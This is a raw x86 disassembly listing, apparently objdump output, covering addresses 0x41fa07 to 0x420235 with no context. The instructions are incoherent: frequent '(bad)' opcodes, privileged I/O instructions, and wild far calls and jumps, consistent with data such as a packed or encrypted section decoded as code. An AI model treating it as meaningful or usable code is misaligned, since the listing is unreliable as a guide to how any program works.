  41fa07:	push   0xee7c1819
  41fa0c:	scas   al,BYTE PTR es:[edi]
  41fa0d:	pop    es
  41fa0e:	sbb    esp,DWORD PTR [esi+0x57]
  41fa11:	neg    BYTE PTR [ecx-0x27]
  41fa14:	dec    ecx
  41fa15:	pop    ebx
  41fa16:	out    dx,eax
  41fa17:	sub    DWORD PTR [eax+esi*1-0x4fa18a38],ebx
  41fa1e:	clc    
  41fa1f:	add    dl,BYTE PTR [eax+ecx*2]
  41fa22:	pop    ebp
  41fa23:	push   ds
  41fa24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa25:	adc    al,0x63
  41fa27:	nop
  41fa28:	fsub   st(2),st
  41fa2a:	leave  
  41fa2b:	test   DWORD PTR [ebp-0x5a],ebx
  41fa2e:	rcr    eax,1
  41fa30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa31:	and    al,0x24
  41fa33:	div    BYTE PTR [edi-0x166e4abc]
  41fa39:	jmp    0x41fa6f
  41fa3b:	fucomi st,st(1)
  41fa3d:	pop    esi
  41fa3e:	mov    ch,0x94
  41fa40:	mov    dh,0xc9
  41fa42:	je     0x41fab0
  41fa44:	ficom  WORD PTR [ebx+0x254c36]
  41fa4a:	add    esp,DWORD PTR [edx]
  41fa4c:	inc    ebx
  41fa4d:	retf   0x130f
  41fa50:	dec    ebx
  41fa51:	shl    DWORD PTR [ecx-0xc43bc7b],1
  41fa57:	pop    edx
  41fa58:	dec    ecx
  41fa59:	leave  
  41fa5a:	call   0xdba18462
  41fa5f:	call   0x4cb0:0x905e904a
  41fa66:	in     eax,0xc6
  41fa68:	test   DWORD PTR [edx-0x76cd9948],ecx
  41fa6e:	cmc    
  41fa6f:	pop    ebx
  41fa70:	cmp    ebx,DWORD PTR [ecx]
  41fa72:	rol    BYTE PTR [ebp-0x21],1
  41fa75:	(bad)  
  41fa77:	xor    eax,0x2fe77ad
  41fa7c:	(bad)  
  41fa7d:	xlat   BYTE PTR ds:[ebx]
  41fa7e:	fadd   QWORD PTR [ebp-0x47526067]
  41fa84:	retf   
  41fa85:	retf   0xbe51
  41fa88:	mov    edx,0x97d0b38d
  41fa8d:	xor    esp,eax
  41fa8f:	fstp   DWORD PTR [ecx+0x22]
  41fa92:	sub    bh,bh
  41fa94:	xchg   al,al
  41fa96:	test   esi,ebx
  41fa98:	retf   0x8194
  41fa9b:	gs xchg ah,cl
  41fa9e:	cwde   
  41fa9f:	imul   ecx,ebx,0x5b
  41faa2:	in     eax,dx
  41faa3:	mov    al,ds:0x8159e00a
  41faa8:	or     esp,DWORD PTR [edx-0x11]
  41faab:	cdq    
  41faac:	xlat   BYTE PTR ds:[ebx]
  41faad:	xchg   edx,eax
  41faae:	inc    edi
  41faaf:	ins    BYTE PTR es:[edi],dx
  41fab0:	xchg   edx,eax
  41fab1:	and    cl,cl
  41fab3:	xor    edi,DWORD PTR [ebx]
  41fab5:	adc    BYTE PTR [ebx+0x66],bl
  41fab8:	jge    0x41fac6
  41faba:	into   
  41fabb:	retf   
  41fabc:	dec    esp
  41fabd:	test   cl,bh
  41fabf:	dec    esp
  41fac0:	sub    ebp,DWORD PTR ds:0x89c91360
  41fac6:	repnz fcom QWORD PTR [ebx-0x7e1f2e8e]
  41facd:	call   0xed5e:0xee6c0c6
  41fad4:	sti    
  41fad5:	ror    BYTE PTR [esi+edx*8-0x33],1
  41fad9:	into   
  41fada:	call   0x39e5f6fa
  41fadf:	lods   al,BYTE PTR ds:[esi]
  41fae0:	add    eax,0x78f060ed
  41fae5:	cli    
  41fae6:	js     0x41fa84
  41fae8:	das    
  41fae9:	ss in  al,dx
  41faeb:	dec    ebp
  41faec:	dec    dl
  41faee:	test   eax,0x14bcd959
  41faf3:	xor    edi,DWORD PTR [esi-0x704a6e2f]
  41faf9:	cmp    eax,0x156e482
  41fafe:	jne    0x41fae1
  41fb00:	fcom   QWORD PTR [eax-0x762df4ea]
  41fb06:	outs   dx,DWORD PTR ds:[esi]
  41fb07:	xor    ah,bh
  41fb09:	outs   dx,DWORD PTR ds:[esi]
  41fb0a:	mov    DWORD PTR [ebx+0x73],eax
  41fb0d:	pop    esp
  41fb0e:	jmp    0x93007fce
  41fb13:	lock test BYTE PTR [ecx],dl
  41fb16:	add    bh,dh
  41fb18:	ds das 
  41fb1a:	push   esi
  41fb1c:	rcl    cl,cl
  41fb1e:	or     eax,DWORD PTR [edi+0x11c2cc6]
  41fb24:	aas    
  41fb25:	xor    ebp,DWORD PTR [edi+0x4]
  41fb28:	or     al,0x4a
  41fb2a:	das    
  41fb2b:	add    ebp,DWORD PTR [edi+0x4f]
  41fb2e:	mov    ch,0x2b
  41fb30:	fiadd  WORD PTR [ebp+0x2b]
  41fb33:	jle    0x41fb11
  41fb35:	inc    ebp
  41fb36:	add    edi,ecx
  41fb38:	clc    
  41fb39:	shr    DWORD PTR [esp+eax*4],cl
  41fb3c:	fsubrp st(3),st
  41fb3e:	dec    edi
  41fb3f:	imul   esi,DWORD PTR [edi-0x29b4a406],0x1c
  41fb46:	mov    cl,0x50
  41fb48:	xor    eax,DWORD PTR [ebx+0x63]
  41fb4b:	xchg   esi,edx
  41fb4d:	test   eax,0x1f2c67cd
  41fb52:	xor    BYTE PTR [ebx-0x44ef0edc],cl
  41fb58:	xor    ebp,0x31
  41fb5b:	das    
  41fb5c:	rol    ch,1
  41fb5e:	sub    eax,0xc124095f
  41fb63:	sbb    esi,DWORD PTR [edx]
  41fb65:	inc    ebp
  41fb66:	inc    edi
  41fb67:	mov    dl,cl
  41fb69:	lods   al,BYTE PTR ds:[esi]
  41fb6a:	inc    esi
  41fb6b:	aaa    
  41fb6c:	sub    BYTE PTR [ecx],bl
  41fb6e:	sub    al,0x9d
  41fb70:	hlt    
  41fb71:	push   0xa2ddb94e
  41fb76:	push   esi
  41fb77:	pop    esi
  41fb78:	fsubr  QWORD PTR [eax]
  41fb7a:	mov    eax,ds:0x4a7156b0
  41fb7f:	dec    ebp
  41fb80:	cli    
  41fb81:	loop   0x41fb20
  41fb83:	icebp  
  41fb84:	xor    cl,BYTE PTR [ebp+0x7cf2226f]
  41fb8a:	loope  0x41fb25
  41fb8c:	into   
  41fb8d:	call   0x30432351
  41fb92:	add    eax,0x8365561e
  41fb97:	inc    edi
  41fb98:	sahf   
  41fb99:	pop    ss
  41fb9a:	add    al,0x1b
  41fb9c:	repz fs loope 0x41fb88
  41fba0:	push   0xe4eed741
  41fba5:	int    0xb9
  41fba7:	sub    BYTE PTR [edx+0x38],dh
  41fbaa:	dec    eax
  41fbab:	fcmovbe st,st(4)
  41fbad:	iret   
  41fbae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbaf:	cli    
  41fbb0:	pop    ds
  41fbb1:	hlt    
  41fbb2:	add    DWORD PTR [eax+0x1e],ecx
  41fbb5:	mov    edx,0xc3095421
  41fbba:	mov    al,BYTE PTR [ebp+0x14180570]
  41fbc0:	cmp    dl,BYTE PTR [ebx]
  41fbc2:	jo     0x41fb6d
  41fbc4:	add    al,0xb4
  41fbc6:	aam    0x56
  41fbc8:	add    eax,0xf544123
  41fbcd:	xor    al,BYTE PTR [eax]
  41fbcf:	mov    edx,0x83f5f6db
  41fbd4:	test   al,0x49
  41fbd6:	dec    edx
  41fbd7:	xchg   esp,eax
  41fbd8:	pop    esi
  41fbd9:	daa    
  41fbda:	test   BYTE PTR [ecx-0x3f],dh
  41fbdd:	repnz push ds
  41fbdf:	jno    0x41fb9c
  41fbe1:	jbe    0x41fbf8
  41fbe3:	xchg   ecx,eax
  41fbe4:	cdq    
  41fbe5:	add    eax,0xa53a7719
  41fbea:	xchg   edi,eax
  41fbeb:	in     eax,dx
  41fbec:	jae    0x41fc62
  41fbee:	xabort 0xc8
  41fbf1:	xor    dl,BYTE PTR [ebp+ebp*1-0x4e]
  41fbf5:	outs   dx,BYTE PTR ds:[esi]
  41fbf6:	or     DWORD PTR [ebp-0x6],ecx
  41fbf9:	xchg   BYTE PTR [edi+0x58a8398b],bl
  41fbff:	adc    eax,0x7f6c1936
  41fc04:	push   ebp
  41fc05:	cmp    al,0x49
  41fc07:	xchg   esi,eax
  41fc08:	test   eax,0xd511847f
  41fc0d:	call   0x2de8:0x185e4424
  41fc14:	or     DWORD PTR [ebp+0x50],edi
  41fc17:	fidiv  WORD PTR [ecx]
  41fc19:	mov    ds:0x2f4aa336,eax
  41fc1e:	or     ah,ah
  41fc20:	outs   dx,DWORD PTR ds:[esi]
  41fc21:	jg     0x41fc44
  41fc23:	scas   al,BYTE PTR es:[edi]
  41fc24:	sahf   
  41fc25:	in     al,dx
  41fc26:	pop    es
  41fc27:	imul   edx,DWORD PTR [ecx+ebx*1+0xe004468],0x2c0f7ab1
  41fc32:	out    dx,eax
  41fc33:	jl     0x41fca5
  41fc35:	push   ss
  41fc36:	dec    esp
  41fc37:	aad    0xfe
  41fc39:	mov    ecx,0x5d1e91f
  41fc3e:	rol    ecx,0x5f
  41fc41:	scas   al,BYTE PTR es:[edi]
  41fc42:	out    dx,al
  41fc43:	sub    DWORD PTR [edi],esp
  41fc45:	cs rcr dl,0xcb
  41fc49:	daa    
  41fc4a:	mov    eax,ds:0xa455dff9
  41fc4f:	scas   eax,DWORD PTR es:[edi]
  41fc50:	or     DWORD PTR [edx-0x7d8918d],0x5942760b
  41fc5a:	loopne 0x41fcd1
  41fc5c:	inc    ebx
  41fc5d:	lods   al,BYTE PTR ds:[esi]
  41fc5e:	sbb    edx,ebp
  41fc60:	repz les edx,FWORD PTR [edx+0x3142582c]
  41fc67:	out    0x44,al
  41fc69:	dec    esp
  41fc6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc6b:	das    
  41fc6c:	mov    WORD PTR [esp+edx*1],ds
  41fc6f:	xchg   ebp,eax
  41fc70:	push   ebx
  41fc71:	sti    
  41fc72:	test   BYTE PTR [edi-0x4c],cl
  41fc75:	mov    WORD PTR [eax],gs
  41fc77:	scas   al,BYTE PTR es:[edi]
  41fc78:	mov    ch,0xc7
  41fc7a:	stos   BYTE PTR es:[edi],al
  41fc7b:	out    dx,al
  41fc7c:	mov    ds:0xf118b877,al
  41fc81:	div    cl
  41fc83:	shr    BYTE PTR [edi+0x4eceb97c],0x96
  41fc8a:	out    dx,al
  41fc8b:	imul   ebx,DWORD PTR [esi-0x41],0xffffff9d
  41fc8f:	mov    ebp,0xe26e6e95
  41fc94:	in     al,dx
	...
  41fd11:	add    BYTE PTR [eax],al
  41fd13:	add    BYTE PTR [edi+0x5d7b4dd7],al
  41fd19:	sti    
  41fd1a:	mov    bh,0xff
  41fd1c:	ds aad 0x54
  41fd1f:	ret    0x381a
  41fd22:	sbb    BYTE PTR [edi-0xe],bl
  41fd25:	xchg   ebp,eax
  41fd26:	add    DWORD PTR [eax],eax
  41fd28:	imul   eax,DWORD PTR [edi],0x878c0000
  41fd2e:	sbb    al,0x33
  41fd30:	jnp    0x41fd14
  41fd32:	inc    DWORD PTR [esi+0x5fb83ce]
  41fd38:	mov    ebp,0xceb6402c
  41fd3d:	nop
  41fd3e:	adc    DWORD PTR [eax],esi
  41fd40:	cmp    al,BYTE PTR [esi-0x6b]
  41fd43:	leave  
  41fd44:	cmp    edi,esp
  41fd46:	cmc    
  41fd47:	and    eax,0x10005b6a
  41fd4c:	call   0xbccddf0f
  41fd51:	stc    
  41fd52:	shl    DWORD PTR [ebp-0x3a],cl
  41fd55:	jns    0x41fd04
  41fd57:	cld    
  41fd58:	pop    edx
  41fd59:	push   ds
  41fd5a:	sub    al,0x69
  41fd5c:	jno    0x41fd30
  41fd5e:	or     al,0x9a
  41fd60:	cmp    al,0x70
  41fd62:	repz mov esp,0xce1b234a
  41fd68:	int    0xd5
  41fd6a:	call   0xee4c:0xc9f0de54
  41fd71:	aad    0xd8
  41fd73:	jo     0x41fd5b
  41fd75:	pop    ds
  41fd76:	xchg   ecx,eax
  41fd77:	fidiv  WORD PTR [ecx+0x1c528939]
  41fd7d:	das    
  41fd7e:	mov    ds:0x40f1af69,eax
  41fd83:	xchg   esi,eax
  41fd84:	mov    bl,0x22
  41fd86:	lods   eax,DWORD PTR ds:[esi]
  41fd87:	cmp    al,0xd2
  41fd89:	popa   
  41fd8a:	test   BYTE PTR [ebx],dh
  41fd8c:	das    
  41fd8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd8e:	aam    0x17
  41fd90:	cmp    BYTE PTR [ebx],dl
  41fd92:	push   ds
  41fd93:	rcl    DWORD PTR [edi-0x323857d],cl
  41fd99:	test   al,0x4f
  41fd9b:	data16 fld TBYTE PTR [ebx+0x12e82633]
  41fda2:	push   edx
  41fda3:	and    ebp,ebp
  41fda5:	iret   
  41fda6:	mov    eax,ds
  41fda8:	mov    WORD PTR [eax+0x749e92ba],es
  41fdae:	mov    ecx,0x120b2f86
  41fdb3:	and    eax,0x17b1581e
  41fdb8:	jns    0x41fd58
  41fdba:	or     bh,BYTE PTR [esi+eiz*1-0x37]
  41fdbe:	call   0xe465b18b
  41fdc3:	int3   
  41fdc4:	xor    eax,0xc31938e5
  41fdc9:	idiv   DWORD PTR [edx]
  41fdcb:	fsub   st,st(0)
  41fdcd:	sub    DWORD PTR [eax],ebx
  41fdcf:	fisttp QWORD PTR [ebp-0x2c]
  41fdd2:	fist   DWORD PTR [edx+eax*8-0x659afd0]
  41fdd9:	mov    WORD PTR [edx+0x52b59d21],?
  41fddf:	fs je  0x41fe16
  41fde2:	xchg   edi,eax
  41fde3:	push   ecx
  41fde4:	add    bl,bh
  41fde6:	push   DWORD PTR [ebx+0x6b]
  41fde9:	jp     0x41fd80
  41fdeb:	cmp    al,0x88
  41fded:	or     al,0xce
  41fdef:	mov    BYTE PTR [edi+0x2e39503a],bh
  41fdf5:	jl     0x41fe60
  41fdf7:	mov    edx,0x57a6a734
  41fdfc:	adc    DWORD PTR ds:0xcfcd9c79,0x3f89300d
  41fe06:	sub    BYTE PTR [esi-0x55b4c8d9],0x88
  41fe0d:	aas    
  41fe0e:	xchg   esi,eax
  41fe0f:	idiv   ch
  41fe11:	adc    al,0xb8
  41fe13:	push   esi
  41fe14:	fistp  WORD PTR ss:[esi]
  41fe17:	push   edi
  41fe18:	js     0x41fe3f
  41fe1a:	mov    WORD PTR [esi-0x5a0ed75a],fs
  41fe20:	sbb    cl,BYTE PTR [esi]
  41fe22:	push   edi
  41fe23:	xor    eax,0x2d29addb
  41fe28:	repnz and eax,0xb4384006
  41fe2e:	inc    esp
  41fe2f:	and    ebx,DWORD PTR [edx]
  41fe31:	jbe    0x41fe68
  41fe33:	sub    BYTE PTR [ecx-0x309be331],cl
  41fe39:	pop    DWORD PTR [ecx]
  41fe3b:	daa    
  41fe3c:	pop    esp
  41fe3d:	pop    esi
  41fe3e:	shr    BYTE PTR [edx],1
  41fe40:	sub    BYTE PTR [ecx+0x536643bc],bh
  41fe46:	push   edi
  41fe47:	or     eax,0xf55e4594
  41fe4c:	mov    edx,edi
  41fe4e:	mov    es,WORD PTR [ebx-0xe24c05d]
  41fe54:	imul   edx,DWORD PTR [esi+0x6656c7a4],0x1d
  41fe5b:	call   0x7656:0xe94da7b7
  41fe62:	addr16 pop ds
  41fe64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe65:	add    eax,0x9b0e0697
  41fe6a:	fcom   DWORD PTR [esi-0x7bf996e]
  41fe70:	or     DWORD PTR [edi-0x16],ebx
  41fe73:	push   es
  41fe74:	loopne 0x41fe52
  41fe76:	pop    ecx
  41fe77:	js     0x41fe41
  41fe79:	int    0x56
  41fe7b:	into   
  41fe7c:	int    0xe5
  41fe7e:	arpl   WORD PTR [ebp+eiz*2-0x179e2baf],bx
  41fe85:	mov    eax,cs:0xd22b7c99
  41fe8b:	(bad)  
  41fe8c:	jecxz  0x41fe41
  41fe8e:	xchg   edi,eax
  41fe8f:	xor    ebx,ecx
  41fe91:	push   ds
  41fe92:	adc    ah,BYTE PTR [esi+ebp*2-0x4ec7f75e]
  41fe99:	repnz addr16 fs mov ah,0xd5
  41fe9e:	inc    edx
  41fe9f:	mov    WORD PTR [ebx],cs
  41fea1:	lods   eax,DWORD PTR ds:[esi]
  41fea2:	sahf   
  41fea3:	das    
  41fea4:	inc    esi
  41fea5:	sub    al,0x6a
  41fea7:	out    dx,al
  41fea8:	xor    edi,DWORD PTR [eax+0x46]
  41feab:	enter  0xb12c,0xe1
  41feaf:	cmp    ebp,eax
  41feb1:	sar    BYTE PTR [edx],cl
  41feb3:	imul   esp,DWORD PTR [eax+0x2781a25c],0x704d2243
  41febd:	hlt    
  41febe:	sbb    ecx,DWORD PTR [ecx+0xfbeb65c]
  41fec4:	add    dh,dh
  41fec6:	mov    BYTE PTR [ebp+esi*2-0x1dd9ef04],al
  41fecd:	push   ebp
  41fece:	shl    DWORD PTR [edx],1
  41fed0:	mov    cs,ecx
  41fed2:	jg     0x41fef8
  41fed4:	(bad)  
  41fed5:	icebp  
  41fed6:	xchg   ebp,eax
  41fed7:	into   
  41fed8:	or     DWORD PTR ds:0x8f4889d8,esi
  41fede:	and    ch,BYTE PTR [edx]
  41fee0:	add    esi,DWORD PTR [edx]
  41fee2:	mov    ah,0xdc
  41fee4:	pop    ecx
  41fee5:	sbb    BYTE PTR [eax+0x20],dl
  41fee8:	xchg   edi,eax
  41fee9:	pop    edi
  41feea:	retf   0xc8cf
  41feed:	cmp    dl,BYTE PTR [edx]
  41feef:	in     al,dx
  41fef0:	sbb    eax,0x4c8ab334
  41fef5:	bound  ebx,QWORD PTR [ecx]
  41fef7:	fdivr  DWORD PTR ds:0xbc1564f4
  41fefd:	jb     0x41fe8b
  41feff:	jmp    0x2273:0x75ac4f4c
  41ff06:	aam    0x25
  41ff08:	jmp    0x4d548680
  41ff0d:	jge    0x41fe98
  41ff0f:	call   DWORD PTR [ebx]
  41ff11:	and    BYTE PTR [esp+eax*4],ch
  41ff14:	loopne 0x41feff
  41ff16:	jmp    0x90a3e6ec
  41ff1b:	push   ds
  41ff1c:	lahf   
  41ff1d:	punpcklbw mm6,DWORD PTR [ebx]
  41ff20:	mov    ebx,0xadf1a4a8
  41ff25:	dec    ebp
  41ff26:	cdq    
  41ff27:	int3   
  41ff28:	mov    edx,DWORD PTR [ebp-0x425bcde9]
  41ff2e:	or     al,0x40
  41ff30:	jo     0x41fec9
  41ff32:	dec    edi
  41ff33:	icebp  
  41ff34:	mov    edx,0x23a8fc86
  41ff39:	cmp    BYTE PTR [eax-0x633536f4],bl
  41ff3f:	jno    0x41ff84
  41ff41:	xor    BYTE PTR [ebx+0x1c8f5838],dh
  41ff47:	ror    edx,cl
  41ff49:	mov    ds:0xa3dec08c,eax
  41ff4e:	aaa    
  41ff4f:	adc    BYTE PTR [edi+edx*8-0x66],bh
  41ff53:	shl    BYTE PTR [eax],1
  41ff55:	test   ch,0xa4
  41ff58:	lock jmp 0x41fedb
  41ff5b:	mov    ebp,DWORD PTR [edi]
  41ff5d:	stos   BYTE PTR es:[edi],al
  41ff5e:	and    eax,0x5524b345
  41ff63:	sbb    BYTE PTR [esi+edi*1],0x60
  41ff67:	(bad)  
  41ff68:	cli    
  41ff69:	cmp    DWORD PTR [ecx],edi
  41ff6b:	test   al,0x47
  41ff6d:	ds jns 0x41fef9
  41ff70:	mov    esp,0x24385410
  41ff75:	bound  esi,QWORD PTR ds:0xcda13d13
  41ff7b:	inc    esi
  41ff7c:	xor    bl,0xb2
  41ff7f:	mov    al,ds:0x4ff05530
  41ff84:	pop    edx
  41ff85:	ja     0x41ff5f
  41ff87:	mov    ecx,edx
  41ff89:	push   esi
  41ff8a:	cdq    
  41ff8b:	inc    esi
  41ff8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff8d:	fld    TBYTE PTR [ebp+0x48]
  41ff90:	pop    eax
  41ff91:	ins    BYTE PTR es:[edi],dx
  41ff92:	push   ebp
  41ff93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff94:	cmp    cl,BYTE PTR [edx+esi*4]
  41ff97:	add    ah,BYTE PTR [esi+0x71]
  41ff9a:	dec    edx
  41ff9b:	push   ebx
  41ff9c:	dec    ecx
  41ff9d:	mov    ds:0x3a3d2fcc,al
  41ffa2:	sub    eax,0x4da4ea22
  41ffa7:	imul   BYTE PTR [eax]
  41ffa9:	je     0x41ffbb
  41ffab:	in     al,dx
  41ffac:	fsubr  st,st(3)
  41ffae:	(bad)  
  41ffb0:	adc    eax,0xcb7e3ec9
  41ffb5:	mov    ebp,0xde5f2419
  41ffba:	and    eax,0x41a29c37
  41ffbf:	sbb    DWORD PTR [edi+0x7],0xce0c81a6
  41ffc6:	test   DWORD PTR [edi+ecx*2+0xb75fbd7],eax
  41ffcd:	gs out 0xfa,al
  41ffd0:	mov    ch,0xf1
  41ffd2:	clc    
  41ffd3:	fs jg  0x41ffc0
  41ffd6:	mov    ds,WORD PTR [ebx+0x71b5786a]
  41ffdc:	loop   0x41ff92
  41ffde:	mov    esi,0xa9cfce29
  41ffe3:	int    0x78
  41ffe5:	in     al,0xf2
  41ffe7:	loope  0x41ff76
  41ffe9:	je     0x41ff9d
  41ffeb:	mov    cl,BYTE PTR [esi]
  41ffed:	or     bh,BYTE PTR [ebx]
  41ffef:	push   cs
  41fff0:	and    DWORD PTR [esp+esi*4-0x42ac9d94],ecx
  41fff7:	mov    edx,0x9264ceef
  41fffc:	and    BYTE PTR [ebx],cl
  41fffe:	and    DWORD PTR [esi],ebx
  420000:	mov    ?,WORD PTR [esi+0x5379eaff]
  420006:	int    0x75
  420008:	pop    ebx
  420009:	or     BYTE PTR [ecx],al
  42000b:	das    
  42000c:	jmp    0x42004e
  42000e:	mov    ch,0xa9
  420010:	mov    DWORD PTR [ebp+eiz*4-0x5a],edi
  420014:	imul   BYTE PTR [ebx]
  420016:	dec    esi
  420017:	dec    eax
  420018:	fwait
  420019:	jle    0x41ffb6
  42001b:	push   edi
  42001c:	icebp  
  42001d:	mov    ds:0xd91144d4,eax
  420022:	jbe    0x420052
  420024:	xchg   esi,eax
  420025:	(bad)  
  420026:	adc    al,bl
  420028:	sub    al,0xde
  42002a:	stos   BYTE PTR es:[edi],al
  42002b:	(bad)  
  42002c:	push   esi
  42002d:	inc    edx
  42002e:	xchg   dh,ah
  420030:	stos   BYTE PTR es:[edi],al
  420031:	mov    ch,0xfc
  420033:	call   0x65a796de
  420038:	cmp    ebx,DWORD PTR [esi+ecx*2+0x2d]
  42003c:	retf   
  42003d:	in     al,0xf3
  42003f:	sbb    eax,0xbfd6d2ca
  420044:	or     eax,esp
  420046:	in     eax,dx
  420047:	or     eax,0xc1f15943
  42004c:	push   esi
  42004d:	or     eax,0x99099511
  420052:	and    eax,0xec53171d
  420057:	dec    edi
  420058:	lahf   
  420059:	adc    esi,DWORD PTR [edx+0x28]
  42005c:	leave  
  42005d:	pop    ss
  42005e:	jecxz  0x420011
  420060:	jp     0x420037
  420062:	mov    dl,0xfa
  420064:	das    
  420065:	adc    eax,0xf673742e
  42006a:	sbb    BYTE PTR [eax-0x6a666a2],dh
  420070:	dec    eax
  420071:	adc    DWORD PTR [edx+0xe0d6895],0x45662c7b
  42007b:	xor    bh,dh
  42007d:	mov    ch,0xf2
  42007f:	pop    es
  420080:	(bad)  
  420081:	jecxz  0x4200e0
  420083:	adc    DWORD PTR [ebx+0x64],0xffffffc9
  420087:	inc    ebp
  420088:	(bad)  
  420089:	cmp    esi,edx
  42008b:	lock mov ebx,0x4751b0d7
  420091:	jae    0x420101
  420093:	push   ds
  420094:	loope  0x420032
  420096:	xchg   BYTE PTR [esi+0x5d],bh
  420099:	sbb    ebx,DWORD PTR [edi+0x47272c05]
  42009f:	fstp   DWORD PTR [edx+0x10]
  4200a2:	sub    dl,BYTE PTR [eax+ebp*4-0x7e]
  4200a6:	xor    al,0x27
  4200a8:	das    
  4200a9:	ins    BYTE PTR es:[edi],dx
  4200aa:	fldpi  
  4200ac:	mov    bl,0x40
  4200ae:	mov    ecx,0x470f8fe9
  4200b3:	pop    ebp
  4200b4:	retf   0x733b
  4200b7:	xor    bh,BYTE PTR [edi+0x55d4a585]
  4200bd:	test   al,ah
  4200bf:	fnsave [eax+0x7c13facc]
  4200c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200c6:	iret   
  4200c7:	dec    ebx
  4200c8:	stos   DWORD PTR es:[edi],eax
  4200c9:	inc    ebx
  4200ca:	cmp    eax,0x7633f296
  4200cf:	sub    eax,DWORD PTR [ebp+edx*1-0x4ab9a34f]
  4200d6:	push   ebp
  4200d7:	adc    dl,BYTE PTR [esi+0x6a64c207]
  4200dd:	fcomi  st,st(5)
  4200df:	ja     0x420077
  4200e1:	jmp    0xb71d:0x6f8b5858
  4200e8:	daa    
  4200e9:	test   DWORD PTR [ecx-0x50a92379],ebx
  4200ef:	cli    
  4200f0:	add    ebx,DWORD PTR [edi]
  4200f2:	iret   
  4200f3:	push   ss
  4200f4:	sar    DWORD PTR [ebp-0x10],1
  4200f7:	xlat   BYTE PTR ds:[ebx]
  4200f8:	jmp    0xb136:0x11ee546
  4200ff:	mov    ebp,0x2af7a5fa
  420104:	fnsave [ecx]
  420106:	fdivr  DWORD PTR [edx+edi*8]
  420109:	xor    edx,DWORD PTR [ebx+0x32]
  42010c:	(bad)  
  42010d:	scas   eax,DWORD PTR es:[edi]
  42010e:	add    BYTE PTR [ebp-0x5f9586d1],ah
  420114:	(bad)  
  420116:	gs dec eax
  420118:	pop    es
  420119:	call   0x3fe1:0x2f01c560
  420120:	push   edx
  420121:	add    eax,0xd85e9884
  420126:	nop
  420127:	fwait
  420128:	push   ecx
  420129:	jecxz  0x420127
  42012b:	loopne 0x4200c6
  42012d:	int3   
  42012e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42012f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420130:	cmc    
  420131:	xchg   ecx,eax
  420132:	xor    ch,BYTE PTR [edx]
  420134:	sbb    al,0x75
  420136:	cmp    al,0x13
  420138:	int3   
  420139:	jl     0x4201b8
  42013b:	(bad)  
  42013c:	pop    ebp
  42013d:	cmp    al,0x8e
  42013f:	and    ebx,DWORD PTR ds:0x8ad20081
  420145:	pop    edi
  420146:	inc    edx
  420147:	fld    QWORD PTR [edx+ebx*2+0x7484d276]
  42014e:	pop    ecx
  42014f:	or     esp,eax
  420151:	dec    bx
  420153:	in     al,0xc0
  420155:	xchg   ebx,eax
  420156:	stos   DWORD PTR es:[edi],eax
  420157:	mov    bh,0xcf
  420159:	adc    DWORD PTR [edi+ebx*4],esi
  42015c:	sub    dh,BYTE PTR [ebx]
  42015e:	adc    al,0x3a
  420160:	jl     0x420101
  420162:	repnz pop edx
  420164:	out    dx,al
  420165:	dec    edi
  420166:	shr    dl,0xe8
  420169:	iret   
  42016a:	sbb    bl,bl
  42016c:	mov    ebx,0x2a08898c
  420171:	ffree  st(4)
  420173:	out    0xfa,eax
  420175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420176:	(bad)  
  420177:	repz cwde 
  420179:	cs mov ebp,0x33b907cd
  42017f:	fwait
  420180:	in     ax,0x22
  420183:	std    
  420184:	les    edx,FWORD PTR [ecx-0x4a2305ce]
  42018a:	(bad)  
  42018b:	cdq    
  42018c:	adc    eax,0xdff85274
  420191:	in     al,dx
  420192:	add    DWORD PTR [edi+0x50],0x68
  420196:	test   bh,0xcf
  420199:	nop
  42019a:	xor    al,0x41
  42019c:	(bad)  
  42019d:	jge    0x420159
  42019f:	jp     0x420195
  4201a1:	jo     0x42017c
  4201a3:	dec    esp
  4201a4:	add    BYTE PTR [edi+0x59b19010],0x8e
  4201ab:	xor    DWORD PTR [ebx],esp
  4201ad:	push   es
  4201ae:	fist   WORD PTR es:[edi+0x2]
  4201b2:	push   edi
  4201b3:	push   edi
  4201b4:	sbb    BYTE PTR [esi+0x24],dl
  4201b7:	jae    0x420190
  4201b9:	mov    ecx,0x88aa469e
  4201be:	mov    dh,0x76
  4201c0:	mov    ds:0xf94acbd0,al
  4201c5:	mov    ah,0x82
  4201c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201c8:	test   al,0x9e
  4201ca:	daa    
  4201cb:	inc    edx
  4201cc:	xor    BYTE PTR [esi],dl
  4201ce:	fild   QWORD PTR [edx+0x36]
  4201d1:	fadd   DWORD PTR [eax+0x71066295]
  4201d7:	enter  0xfd13,0xd1
  4201db:	cmp    eax,0x7fc3f223
  4201e0:	repz retf 
  4201e2:	xchg   BYTE PTR [edx],cl
  4201e4:	test   al,bh
  4201e6:	mov    DWORD PTR [edx-0x467fed15],edi
  4201ec:	sbb    eax,0x217141db
  4201f1:	int    0x7
  4201f3:	(bad)  
  4201f5:	ja     0x4201cb
  4201f7:	mov    edi,0x76ab6adf
  4201fc:	clc    
  4201fd:	fisttp DWORD PTR [esi+0x5e]
  420200:	(bad)  
  420201:	cld    
  420202:	sbb    BYTE PTR [ecx],dl
  420204:	mov    ds:0xaf95ea6e,al
  420209:	int3   
  42020a:	pop    ecx
  42020b:	fisttp DWORD PTR [esi+0x63]
  42020e:	adc    al,0xf4
  420210:	add    eax,0x58a5bfe1
  420215:	jb     0x4201eb
  420217:	cmp    esp,ebp
  420219:	mov    edi,0xbe727a6a
  42021e:	enter  0xc2d2,0xd6
  420222:	fcmovnbe st,st(0)
  420224:	jno    0x4201e5
  420226:	mov    ecx,DWORD PTR [ebp+0x23b713a5]
  42022c:	rcl    DWORD PTR [edx],0xb7
  42022f:	dec    ecx
  420230:	mov    dh,0xa4
  420232:	popf   
  420233:	pop    es
  420234:	dec    ebx
  420235:	pop    ebp
